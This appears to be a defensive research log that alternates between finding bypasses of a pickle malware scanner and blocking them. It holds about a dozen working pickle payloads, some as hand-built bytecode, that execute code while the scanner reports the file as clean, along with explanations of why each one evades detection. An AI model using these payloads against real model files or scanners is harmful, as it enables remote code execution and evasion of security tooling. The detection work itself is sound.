# Picklescan RCE Bypass Game

## Turn 1 - `mailcap.findmatch` policy gap

Goal: produce an RCE-capable pickle that `packages/modelaudit-picklescan`
does not flag.

Payload shape:

```python
import mailcap


class MailcapFindmatchRce:
    def __reduce__(self):
        caps = {
            "text/plain": [
                {
                    "view": "cat %s",
                    "test": "touch /tmp/modelaudit_mailcap_findmatch_rce_marker",
                }
            ]
        }
        return (mailcap.findmatch, (caps, "text/plain", "view", "/tmp/modelaudit-safe-input", []))
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/modelaudit_mailcap_findmatch_rce_marker`
- RCE mechanism: `mailcap.findmatch()` evaluates the attacker-controlled
  mailcap `test` command with `os.system()` before returning a viewer command.

Performance note: this is a policy-table miss, not an opcode-analysis miss.
Blocking it should be a constant-time lookup change in `policy.rs` plus a
regression in the adversarial oracle corpus.

## Turn 2 - Block `mailcap.findmatch`

Blocking plan:

- Add `("mailcap", "findmatch")` to the sorted dangerous-global table.
- Add policy coverage so raw `GLOBAL mailcap findmatch` reductions are
  classified as malicious even on Python versions where `mailcap` has been
  removed.
- Add a CPython oracle regression that builds the exact marker-file payload on
  Python versions with `mailcap` and verifies both scanner detection and
  runtime execution.

Performance note: the fix preserves the existing `binary_search_by()` lookup
path and adds one table entry, so hot-path cost remains O(log n) with no extra
payload scanning.

## Turn 3 - `setuptools._distutils.spawn.spawn` namespace gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
import setuptools._distutils.spawn as dist_spawn


class SetuptoolsDistutilsSpawnRce:
    def __reduce__(self):
        return (dist_spawn.spawn, (["/usr/bin/touch", "/tmp/ma_sdu_marker"],))
```

Proof with CPython 3.12.12 plus `setuptools` installed:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/ma_sdu_marker`
- RCE mechanism: `setuptools._distutils.spawn.spawn()` directly calls
  `subprocess.check_call(cmd, ...)` with an attacker-controlled command list.

Why the scanner missed it:

- The policy wildcards `distutils`, but Python packaging environments commonly
  expose the compatibility namespace `setuptools._distutils`.
- `global_severity()` checks exact wildcard modules and the top-level module
  only, so `setuptools._distutils.spawn.spawn` does not inherit the existing
  `distutils` wildcard.

Performance note: this is another policy-table miss. The narrow next block is a
sorted `DANGEROUS_GLOBALS` entry for
`("setuptools._distutils.spawn", "spawn")`, which preserves the existing
O(log n) lookup and avoids broad `setuptools` false positives.

## Turn 4 - Block `setuptools._distutils.spawn.spawn`

Blocking plan:

- Add `("setuptools._distutils.spawn", "spawn")` to the sorted
  dangerous-global table instead of wildcarding all `setuptools`.
- Add portable policy coverage for raw `GLOBAL setuptools._distutils.spawn
  spawn` reductions so detection does not depend on `setuptools` being
  installed in the test environment.
- Add an optional CPython oracle regression that imports
  `setuptools._distutils.spawn` when available, verifies scanner detection, then
  verifies runtime marker-file execution.

Performance note: the block is a single additional binary-search entry. It does
not add any module-prefix expansion or extra payload walking.

## Turn 5 - `pipes.Template.copy` pipeline execution gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
import pipes


class PipesTemplateCopyRce:
    def __reduce__(self):
        template = pipes.Template()
        template.append("touch /tmp/ma_pipes_marker; cat $IN > $OUT", "ff")
        return (pipes.Template.copy, (template, "/dev/null", "/tmp/ma_pipes_out"))
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/ma_pipes_marker` and
  `/tmp/ma_pipes_out`
- RCE mechanism: `pipes.Template.copy()` calls
  `os.system(self.makepipeline(infile, outfile))`; the pickled `Template`
  instance carries attacker-controlled `steps`, so the final pipeline is
  attacker-controlled shell syntax.

Why the scanner missed it:

- `pipes` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The callable is reached as the dotted global `pipes.Template.copy`; protocol
  4 dotted-name resolution avoids any separately flagged helper such as
  `builtins.getattr`.
- The command string can avoid existing suspicious string literals such as
  `os.system`, `subprocess`, or `eval`.

Performance note: this is a policy coverage gap. The exact scanner key for the
proof is `("pipes", "Template.copy")`, because protocol 4 dotted globals keep
the module as `pipes` and the attribute path as `Template.copy`.

## Turn 6 - Block `pipes.Template` pipeline methods

Blocking plan:

- Add explicit dangerous-global entries for `pipes.Template.copy`,
  `pipes.Template.open`, `pipes.Template.open_r`, and `pipes.Template.open_w`.
  These methods all execute pipeline commands via `os.system()` or `os.popen()`
  when a pickled `Template` carries attacker-controlled `steps`.
- Add portable policy coverage for all four raw global reductions so detection
  does not depend on the deprecated `pipes` module being available.
- Add an optional CPython oracle regression for the proven
  `pipes.Template.copy` marker-file payload when `pipes` is available.

Performance note: the block adds four sorted binary-search entries and no new
payload scanning or module-prefix expansion.

## Turn 7 - `typing._eval_type` / `ForwardRef` eval gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


payload = b"".join(
    [
        b"\x80\x04",
        s("typing"),
        s("_eval_type"),
        b"\x93",
        s("typing"),
        s("ForwardRef"),
        b"\x93",
        s("f(p) or int"),
        b"\x85R",
        b"}",
        s("f"),
        s("pathlib"),
        s("Path.touch"),
        b"\x93s",
        s("p"),
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_typing_eval_type_marker"),
        b"tRs",
        s("int"),
        s("builtins"),
        s("int"),
        b"\x93s",
        b"N\x87R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/ma_typing_eval_type_marker` and returns
  `<class 'int'>`
- RCE mechanism: `typing._eval_type()` evaluates `ForwardRef` expressions via
  Python `eval()`. The pickle constructs `typing.ForwardRef("f(p) or int")`
  during unpickling, supplies attacker-controlled globals where `f` is
  `pathlib.Path.touch` and `p` is a `Path`, then calls `_eval_type`.

Why the scanner missed it:

- `typing` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals:
  `typing._eval_type`, `typing.ForwardRef`, `pathlib.Path.touch`,
  `pathlib.PosixPath`, and `builtins.int`.
- The evaluated string is intentionally bland (`f(p) or int`) and does not
  contain existing suspicious string patterns such as `os.system`,
  `subprocess`, `eval`, `exec`, or `__import__`.

Performance note: this is a policy coverage gap around a direct eval sink. The
narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("typing", "_eval_type")`, with an oracle regression that manually assembles
the pickle so no unpickle-time `ForwardRef` code object has to be serialized.

## Turn 8 - Block `typing._eval_type`

Blocking plan:

- Add `("typing", "_eval_type")` to the sorted dangerous-global table.
- Add portable policy coverage for raw `GLOBAL typing _eval_type` reductions.
- Add a CPython oracle regression that manually builds the
  `ForwardRef("f(p) or int")` payload, verifies scanner detection, then verifies
  marker-file execution during unpickle.

Performance note: the fix is a single additional binary-search entry. It does
not add expression parsing, string scanning, or special handling for typing
objects.

## Turn 9 - `dataclasses._create_fn` generated-source exec gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
import dataclasses
import pickle


class DataclassesCreateFnRce:
    def __reduce__(self):
        return (
            dataclasses._create_fn,
            (
                "x",
                ["a=open('/tmp/ma_dataclasses_create_fn_marker','w').write('x')"],
                ["return int"],
            ),
        )


payload = pickle.dumps(DataclassesCreateFnRce(), protocol=4)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_dataclasses_create_fn_marker` and returns a
  generated function named `x`
- RCE mechanism: `dataclasses._create_fn()` builds Python source from the
  supplied `name`, `args`, and `body`, then calls `exec(txt, globals, ns)`.
  The payload places the side effect in a default argument expression, so it
  executes while the generated inner function is defined during unpickling.

Why the scanner missed it:

- `dataclasses` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The only import reference is `dataclasses._create_fn`, and it is recorded as
  `is_dangerous=False`.
- The generated-source string avoids current suspicious string seeds such as
  `eval(`, `exec(`, `__import__`, `os.system`, and `subprocess`.

Performance note: this is another direct policy coverage gap around an exec
sink. The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("dataclasses", "_create_fn")`, plus a regression that proves scan-time
detection before unpickle-time marker creation.

## Turn 10 - Block `dataclasses._create_fn`

Blocking plan:

- Add `("dataclasses", "_create_fn")` to the sorted dangerous-global table.
- Add portable policy coverage for raw `GLOBAL dataclasses _create_fn`
  reductions.
- Add a CPython oracle regression that pickles a default-argument side effect,
  verifies scanner detection, then verifies the marker file appears only during
  unpickle.

Performance note: the fix is a single additional binary-search entry. It does
not add generated-source parsing or broader string scanning.

## Turn 11 - `typing.get_type_hints` annotation eval gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_typing_get_type_hints_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("typing"),
        s("get_type_hints"),
        b"\x93",
        s("builtins"),
        s("type"),
        b"\x93",
        s("C"),
        b")",
        b"}",
        s("__annotations__"),
        b"}",
        s("x"),
        s("f(p) or int"),
        b"s",
        b"s",
        b"\x87R",
        b"}",
        s("f"),
        s("pathlib"),
        s("Path.touch"),
        b"\x93s",
        s("p"),
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_typing_get_type_hints_marker"),
        b"tRs",
        s("int"),
        s("builtins"),
        s("int"),
        b"\x93s",
        b"N\x87R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_typing_get_type_hints_marker` and returns
  `{"x": <class 'int'>}`
- RCE mechanism: the pickle first builds
  `type("C", (), {"__annotations__": {"x": "f(p) or int"}})` using
  `builtins.type`, then calls
  `typing.get_type_hints(C, {"f": pathlib.Path.touch, "p": marker, "int": int}, None)`.
  `get_type_hints()` evaluates string annotations with the supplied globals, so
  the bland annotation expression touches the marker during unpickling.

Why the scanner missed it:

- `typing.get_type_hints` is absent from `DANGEROUS_GLOBALS`, and `typing` is
  not a wildcard-dangerous module.
- The payload uses only currently clean globals:
  `typing.get_type_hints`, `builtins.type`, `pathlib.Path.touch`,
  `pathlib.PosixPath`, and `builtins.int`.
- The evaluated annotation string is intentionally bland (`f(p) or int`) and
  does not contain current suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is a policy coverage gap around a public annotation eval
sink. The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("typing", "get_type_hints")`, plus a manual-pickle oracle regression that
asserts scan-time detection before unpickle-time marker creation.

## Turn 12 - Block `typing.get_type_hints`

Blocking plan:

- Add `("typing", "get_type_hints")` to the sorted dangerous-global table.
- Add portable policy coverage for raw `GLOBAL typing get_type_hints`
  reductions.
- Add a CPython oracle regression that manually builds the annotated class and
  supplied globals, verifies scanner detection, then verifies the marker file
  appears only during unpickle.

Performance note: the fix is a single additional binary-search entry. It does
not add annotation parsing, source parsing, or broader string scanning.

## Turn 13 - `operator.call` public-alias invocation gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_operator_call_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("operator"),
        s("call"),
        b"\x93",
        s("pathlib"),
        s("Path.touch"),
        b"\x93",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_operator_call_marker"),
        b"tR",
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_operator_call_marker` and returns `None`
- RCE mechanism: `operator.call(func, *args, **kwargs)` invokes its supplied
  callable. The pickle resolves the public `operator.call` alias, supplies the
  currently clean callable `pathlib.Path.touch`, constructs a `Path`, and calls
  it during unpickling. The same sink can invoke attacker-chosen importable
  callables with attacker-controlled arguments.

Why the scanner missed it:

- `_operator` is wildcard-dangerous, so a normal `pickle.dumps(operator.call)`
  payload is detected as `_operator.call`; however, a hand-built
  `GLOBAL operator call` resolves through the public `operator` module.
- `operator.call` is absent from `DANGEROUS_GLOBALS`; only
  `operator.attrgetter`, `operator.itemgetter`, and `operator.methodcaller` are
  listed.
- The payload uses only currently clean globals: `operator.call`,
  `pathlib.Path.touch`, and `pathlib.PosixPath`, with no suspicious string
  seeds such as `eval(`, `exec(`, `__import__`, `os.system`, or `subprocess`.

Performance note: this is a policy alias coverage gap for an arbitrary-call
sink. The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("operator", "call")`, plus a manual-pickle oracle regression that proves
scan-time detection before unpickle-time marker creation.

## Turn 14 - Block `operator.call`

Blocking plan:

- Add `("operator", "call")` to the sorted dangerous-global table. The
  `_operator.call` spelling is already covered by the `_operator` wildcard, so
  this closes the public-module alias.
- Add portable policy coverage for raw `GLOBAL operator call` reductions.
- Add a CPython oracle regression that manually builds the public-alias
  `operator.call(pathlib.Path.touch, marker)` pickle, verifies scanner
  detection, then verifies the marker file appears only during unpickle.

Performance note: the fix is a single additional binary-search entry. It does
not add callable-flow analysis or any extra string scanning.

## Turn 15 - `builtins.map` forced-iteration call gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_builtins_map_tuple_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("builtins"),
        s("tuple"),
        b"\x93",
        s("builtins"),
        s("map"),
        b"\x93",
        s("pathlib"),
        s("Path.touch"),
        b"\x93",
        b"]",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_builtins_map_tuple_marker"),
        b"tRa",
        b"\x86R",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_builtins_map_tuple_marker` and returns
  `(None,)`
- RCE mechanism: the pickle constructs `map(pathlib.Path.touch, [marker])`,
  then immediately calls `tuple(...)` on that map object. `map()` stores an
  attacker-selected callable and arguments, while `tuple()` forces iteration
  during unpickling, invoking the callable. The marker proof uses
  `pathlib.Path.touch`, but the same pattern can invoke attacker-chosen
  importable callables with attacker-controlled iterable arguments.

Why the scanner missed it:

- `builtins.map` and `builtins.tuple` are not in `BUILTIN_DANGEROUS_NAMES`.
- The payload uses only currently clean globals: `builtins.tuple`,
  `builtins.map`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is a policy coverage gap around a lazy arbitrary-call
sink that can be forced by another benign builtin. The narrow next block is to
add `map` to `BUILTIN_DANGEROUS_NAMES`, plus a manual-pickle oracle regression
that proves scan-time detection before unpickle-time marker creation.

## Turn 16 - Block `builtins.map`

Blocking plan:

- Add `map` to `BUILTIN_DANGEROUS_NAMES`. `tuple` stays allowed because the
  arbitrary-call sink is `map`; `tuple` only forces iteration.
- Add portable policy coverage for raw `GLOBAL builtins map` reductions.
- Add a CPython oracle regression that manually builds
  `tuple(map(pathlib.Path.touch, [marker]))`, verifies scanner detection, then
  verifies the marker file appears only during unpickle.

Performance note: the fix adds one string to the small builtin-name
membership check. It does not add iterable-flow analysis or broader string
scanning.

## Turn 17 - `itertools.starmap` forced-iteration call gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_itertools_starmap_tuple_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("builtins"),
        s("tuple"),
        b"\x93",
        s("itertools"),
        s("starmap"),
        b"\x93",
        s("pathlib"),
        s("Path.touch"),
        b"\x93",
        b"]",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_itertools_starmap_tuple_marker"),
        b"tR",
        b"\x85",
        b"a",
        b"\x86R",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_itertools_starmap_tuple_marker` and returns
  `(None,)`
- RCE mechanism: the pickle constructs
  `itertools.starmap(pathlib.Path.touch, [(marker,)])`, then immediately calls
  `tuple(...)` on that starmap object. `starmap()` stores an attacker-selected
  callable and argument tuples, while `tuple()` forces iteration during
  unpickling, invoking the callable with attacker-controlled arguments.

Why the scanner missed it:

- `itertools` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `builtins.tuple`,
  `itertools.starmap`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another lazy arbitrary-call sink that can be forced
by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
entry for `("itertools", "starmap")`, plus a manual-pickle oracle regression
that proves scan-time detection before unpickle-time marker creation.

## Turn 18 - Block `itertools.starmap`

Blocking plan:

- Add `("itertools", "starmap")` to the sorted dangerous-global table.
- Add portable policy coverage for raw `GLOBAL itertools starmap` reductions.
- Add a CPython oracle regression that manually builds
  `tuple(itertools.starmap(pathlib.Path.touch, [(marker,)]))`, verifies scanner
  detection, then verifies the marker file appears only during unpickle.

Performance note: the fix is a single additional binary-search entry. It does
not add iterable-flow analysis or broader string scanning.

## Turn 19 - `builtins.filter` forced-iteration call gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_builtins_filter_tuple_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("builtins"),
        s("tuple"),
        b"\x93",
        s("builtins"),
        s("filter"),
        b"\x93",
        s("pathlib"),
        s("Path.touch"),
        b"\x93",
        b"]",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_builtins_filter_tuple_marker"),
        b"tRa",
        b"\x86R",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_builtins_filter_tuple_marker` and returns
  `()`
- RCE mechanism: the pickle constructs `filter(pathlib.Path.touch, [marker])`,
  then immediately calls `tuple(...)` on that filter object. `filter()` stores
  an attacker-selected predicate callable and iterable inputs, while `tuple()`
  forces iteration during unpickling, invoking the predicate with
  attacker-controlled arguments. `Path.touch()` returns `None`, so the returned
  tuple is empty while the side effect still occurs.

Why the scanner missed it:

- `builtins.filter` and `builtins.tuple` are not in
  `BUILTIN_DANGEROUS_NAMES`.
- The payload uses only currently clean globals: `builtins.tuple`,
  `builtins.filter`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another lazy arbitrary-call sink that can be forced
by a benign builtin. The narrow next block is to add `filter` to
`BUILTIN_DANGEROUS_NAMES`, plus a manual-pickle oracle regression that proves
scan-time detection before unpickle-time marker creation.

## Turn 20 - Block `builtins.filter`

Blocking plan:

- Add `filter` to `BUILTIN_DANGEROUS_NAMES`. `tuple` stays allowed because the
  arbitrary-call sink is `filter`; `tuple` only forces iteration.
- Add portable policy coverage for raw `GLOBAL builtins filter` reductions.
- Add a CPython oracle regression that manually builds
  `tuple(filter(pathlib.Path.touch, [marker]))`, verifies scanner detection,
  then verifies the marker file appears only during unpickle.

Performance note: the fix adds one string to the small builtin-name
membership check. It does not add iterable-flow analysis or broader string
scanning.

## Turn 21 - `itertools.takewhile` forced-iteration call gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_itertools_takewhile_tuple_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("builtins"),
        s("tuple"),
        b"\x93",
        s("itertools"),
        s("takewhile"),
        b"\x93",
        s("pathlib"),
        s("Path.touch"),
        b"\x93",
        b"]",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_itertools_takewhile_tuple_marker"),
        b"tRa",
        b"\x86R",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_itertools_takewhile_tuple_marker` and
  returns `()`
- RCE mechanism: the pickle constructs
  `itertools.takewhile(pathlib.Path.touch, [marker])`, then immediately calls
  `tuple(...)` on that takewhile object. `takewhile()` stores an
  attacker-selected predicate callable and iterable inputs, while `tuple()`
  forces iteration during unpickling, invoking the predicate with
  attacker-controlled arguments. `Path.touch()` returns `None`, so the returned
  tuple is empty while the side effect still occurs.

Why the scanner missed it:

- `itertools.takewhile` is absent from `DANGEROUS_GLOBALS`; only
  `itertools.starmap` is currently listed.
- The payload uses only currently clean globals: `builtins.tuple`,
  `itertools.takewhile`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another lazy arbitrary-call sink that can be forced
by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
entry for `("itertools", "takewhile")`, plus a manual-pickle oracle regression
that proves scan-time detection before unpickle-time marker creation.

## Turn 22 - Block `itertools.takewhile`

Blocking plan:

- Add `("itertools", "takewhile")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. `tuple` stays allowed because the arbitrary-call sink is
  `takewhile`; `tuple` only forces iteration.
- Add portable policy coverage for raw `GLOBAL itertools takewhile`
  reductions.
- Add a CPython oracle regression that manually builds
  `tuple(itertools.takewhile(pathlib.Path.touch, [marker]))`, verifies scanner
  detection, then verifies the marker file appears only during unpickle.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add iterable-flow analysis or broader string
scanning.

## Turn 23 - `itertools.dropwhile` forced-iteration call gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_itertools_dropwhile_tuple_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("builtins"),
        s("tuple"),
        b"\x93",
        s("itertools"),
        s("dropwhile"),
        b"\x93",
        s("pathlib"),
        s("Path.touch"),
        b"\x93",
        b"]",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_itertools_dropwhile_tuple_marker"),
        b"tRa",
        b"\x86R",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_itertools_dropwhile_tuple_marker` and
  returns `(PosixPath("/tmp/ma_itertools_dropwhile_tuple_marker"),)`
- RCE mechanism: the pickle constructs
  `itertools.dropwhile(pathlib.Path.touch, [marker])`, then immediately calls
  `tuple(...)` on that dropwhile object. `dropwhile()` stores an
  attacker-selected predicate callable and iterable inputs, while `tuple()`
  forces iteration during unpickling, invoking the predicate with
  attacker-controlled arguments. `Path.touch()` returns `None`, so `dropwhile`
  stops dropping after the first predicate call and yields the original marker
  object after the side effect.

Why the scanner missed it:

- `itertools.dropwhile` is absent from `DANGEROUS_GLOBALS`; only
  `itertools.starmap` and `itertools.takewhile` are currently listed.
- The payload uses only currently clean globals: `builtins.tuple`,
  `itertools.dropwhile`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another lazy arbitrary-call sink that can be forced
by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
entry for `("itertools", "dropwhile")`, plus a manual-pickle oracle regression
that proves scan-time detection before unpickle-time marker creation.

## Turn 24 - Block `itertools.dropwhile`

Blocking plan:

- Add `("itertools", "dropwhile")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. `tuple` stays allowed because the arbitrary-call sink is
  `dropwhile`; `tuple` only forces iteration.
- Add portable policy coverage for raw `GLOBAL itertools dropwhile`
  reductions.
- Add a CPython oracle regression that manually builds
  `tuple(itertools.dropwhile(pathlib.Path.touch, [marker]))`, verifies scanner
  detection, then verifies the marker file appears only during unpickle.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add iterable-flow analysis or broader string
scanning.

## Turn 25 - `itertools.filterfalse` forced-iteration call gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_itertools_filterfalse_tuple_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("builtins"),
        s("tuple"),
        b"\x93",
        s("itertools"),
        s("filterfalse"),
        b"\x93",
        s("pathlib"),
        s("Path.touch"),
        b"\x93",
        b"]",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_itertools_filterfalse_tuple_marker"),
        b"tRa",
        b"\x86R",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_itertools_filterfalse_tuple_marker` and
  returns `(PosixPath("/tmp/ma_itertools_filterfalse_tuple_marker"),)`
- RCE mechanism: the pickle constructs
  `itertools.filterfalse(pathlib.Path.touch, [marker])`, then immediately
  calls `tuple(...)` on that filterfalse object. `filterfalse()` stores an
  attacker-selected predicate callable and iterable inputs, while `tuple()`
  forces iteration during unpickling, invoking the predicate with
  attacker-controlled arguments. `Path.touch()` returns `None`, so
  `filterfalse` treats the predicate result as false and yields the original
  marker object after the side effect.

Why the scanner missed it:

- `itertools.filterfalse` is absent from `DANGEROUS_GLOBALS`; only
  `itertools.dropwhile`, `itertools.starmap`, and `itertools.takewhile` are
  currently listed.
- The payload uses only currently clean globals: `builtins.tuple`,
  `itertools.filterfalse`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another lazy arbitrary-call sink that can be forced
by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
entry for `("itertools", "filterfalse")`, plus a manual-pickle oracle
regression that proves scan-time detection before unpickle-time marker
creation.

## Turn 26 - Block `itertools.filterfalse`

Blocking plan:

- Add `("itertools", "filterfalse")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. `tuple` stays allowed because the arbitrary-call sink is
  `filterfalse`; `tuple` only forces iteration.
- Add portable policy coverage for raw `GLOBAL itertools filterfalse`
  reductions.
- Add a CPython oracle regression that manually builds
  `tuple(itertools.filterfalse(pathlib.Path.touch, [marker]))`, verifies
  scanner detection, then verifies the marker file appears only during
  unpickle.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add iterable-flow analysis or broader string
scanning.

## Turn 27 - `itertools.groupby` key-function call gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_itertools_groupby_tuple_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("builtins"),
        s("tuple"),
        b"\x93",
        s("itertools"),
        s("groupby"),
        b"\x93",
        b"]",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_itertools_groupby_tuple_marker"),
        b"tRa",
        s("pathlib"),
        s("Path.touch"),
        b"\x93",
        b"\x86R",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_itertools_groupby_tuple_marker` and
  returns a one-element tuple whose key is `None` and whose group object is an
  `itertools._grouper`
- RCE mechanism: the pickle constructs
  `itertools.groupby([marker], pathlib.Path.touch)`, then immediately calls
  `tuple(...)` on that groupby object. `groupby()` stores an
  attacker-selected key callable and iterable inputs, while `tuple()` forces
  iteration during unpickling, invoking the key callable with
  attacker-controlled arguments. `Path.touch()` returns `None`, so the group
  key is `None` while the side effect still occurs.

Why the scanner missed it:

